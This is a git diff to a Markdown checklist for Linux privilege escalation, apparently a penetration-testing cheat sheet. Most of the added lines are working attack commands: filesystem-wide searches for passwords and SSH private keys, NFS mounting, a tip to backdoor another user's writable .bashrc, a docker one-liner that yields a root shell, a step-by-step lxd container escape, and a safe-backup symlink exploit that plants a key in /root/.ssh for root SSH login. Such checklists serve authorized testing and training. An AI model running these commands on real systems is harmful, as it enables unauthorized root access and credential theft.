@@ -18,7 +18,7 @@ If you are still trying to gain an initial foothold but you can access local fil
 	groups username
 	cat /etc/groups
 	```
-- [x] Check for super users
+- [ ] Check for super users
 	```bash
 	grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1}' \
 	awk -F: '($3 == "0") {print}' /etc/passwd \
@@ -40,7 +40,7 @@ If you are still trying to gain an initial foothold but you can access local fil
 	# show who is logged on and what he/she's doing
 	w
 	```
-- [x] Last logged in
+- [ ] Last logged in
 	```bash
 	last
 	```
@@ -64,6 +64,11 @@ If you are still trying to gain an initial foothold but you can access local fil
 	```bash
 	ps aux
 	ps aux | grep root
+	```
+- [ ] Look for potentially useful software and compiler
+	```bash
+	# if there is a compiler check if it's vulnerable to kernel exploit
+	which awk perl python ruby gcc cc vi vim nmap find netcat nc wget tftp ftp tmux screen nmap 2>/dev/null
 	```
 ### Network Enumeration
 - [ ] Retrieve the machine hostname
@@ -92,11 +97,15 @@ If you are still trying to gain an initial foothold but you can access local fil
 	```
 ### Credential Access
 - [ ] Try known passwords
-- [ ] Search creds from config files (Try different word other the PASSWORD, e.g: pass, passwd, pwd, user, usr, username, secret, cred, credential, auth):
+- [ ] Search creds from config files (Try different word other than PASSWORD, e.g: pass, passwd, pwd, user, usr, username, secret, cred, credential, auth, secret):
 	```bash
 	grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null
 	find . -type f -exec grep -i -I "PASSWORD" {} /dev/null
 	locate password | more
+	```
+- [ ] Search creds in common files:
+	```bash
+	ls -la /var /var/mail /var/spool/mail
 	```
 - [ ] Search creds from local DBs
 - [ ] Search creds from bash history:
@@ -114,6 +123,10 @@ If you are still trying to gain an initial foothold but you can access local fil
 	ls ~/.ssh/*
 	find / -name authorized_keys 2> /dev/null
 	find / -name id_rsa 2> /dev/null
+	```
+- [ ] 	Search rsync config file
+	```bash
+	find /etc \( -name rsyncd.conf -o -name rsyncd.secrets \)
 	```
 ### Exploit
 - [ ] Kernel  is  vulnerable to known exploit?
@@ -178,6 +191,89 @@ If you are still trying to gain an initial foothold but you can access local fil
 
 	# look for writable configuration file
 	find /etc -type f -writable 2> /dev/null
+	```
+- [ ] Any user owned ifle
+	```bash
+	find / -type f -user username 2>/dev/null
+	```
+- [ ] Any NFS share
+	```bash
+	# check if it's avaiable a NFS share
+	showmount -e X.X.X.X;
+	# mount it and look for files or try to create ones
+	# maybe you are another user
+	mount X.X.X.X:/ /tmp/
+	```
+- [ ] Let [Pspy](https://github.com/DominicBreuker/pspy) spy on the processes
+	```bash
+	# you could find some interesting running processes or credentials
+	./pspy > /tmp/pspy-out.txt
+	```
+- [ ] Is .bashrc writeable?
+	```bash
+	# if another user's .bashrc is writeable, you could
+	# put code inside it and wait the user to login in order
+	# to trigger the execution of it
+	ls -la /home/*/.bashrc; find / -name .bashrc -xdev 2>/dev/nul
+	```
+- [ ] Is the user beloging to docker?
+	```bash
+	# this will spawn a root shell
+	docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+	```
+- [ ] Is the user beloging to lxd?
+	```bash
+	# clone the repo and build an alpine image
+	git clone https://github.com/saghul/lxd-alpine-builder
+	cd lxd-alpine-builder
+	sed -i 's,yaml_path="latest-stable/releases/$apk_arch/latest-releases.yaml",yaml_path="v3.8/releases/$apk_arch/latest-releases.yaml",' build-alpine
+	sudo ./build-alpine -a i686
+
+	# transfer the image to the target, then import the image
+	lxc image import ./alpine*.tar.gz --alias myimage # It's important doing this from YOUR HOME directory on the victim machine, or it might fail.
+
+	# before running the image, start and configure the lxd storage pool as default 
+	lxd init
+
+	# run the image
+	lxc init myimage mycontainer -c security.privileged=true
+
+	# mount the /root into the image
+	lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
+
+	# pop the shell
+	lxc start mycontainer
+	lxc exec mycontainer /bin/sh
+	```
+- [ ] Ability to use [safe-backup](https://github.com/scrwdrv/safe-backup) as another user (root)?
+	```bash
+	# you can install safe-backup on your system, now you can
+	# potentially backup whatever you want e.g.: your root public ssh key!
+
+	## Preparation
+	### ON ATTACKING MACHINE
+	sudo safe-backup -i /root/.ssh/ -o /tmp/backup
+	# copy the safe-backup's encryption key to the /tmp/backup directory
+	sudo cp /root/.config/safe-backup/key.safe /tmp/backup/key.safe
+	# transfer them to the target machine
+
+	## Getting ready
+	### ON TARGET MACHINE
+	# you have to import the newly downloaded encryption key :)
+	sudo /usr/bin/safe-backup --import-key /path/where/is/key.safe
+	# When decrypting files, safe-backup creates # a new directory
+	# with the same name as the backup but without the .bua extension.
+	# If this directory already exists, the existing directory is used
+	#rather than a new one being created. We can exploit this by
+	# creating a symbolic link to /root/.ssh and having safe-backup
+	# decrypt folders into this directory.
+	ln -s /root/.ssh /path/where/is/-root-.ssh
+	
+	## Exploitation
+	### ON TARGET MACHINE
+	sudo safe-backup -d /path/where/is/-root-.ssh.bua
+	### ON ATTACKING MACHINE
+	sudo ssh -i /root/.ssh/id_rsa root@$IP
 	```
 - [ ] Any accessible sensitive file?
 	- [ ] /etc/passwd
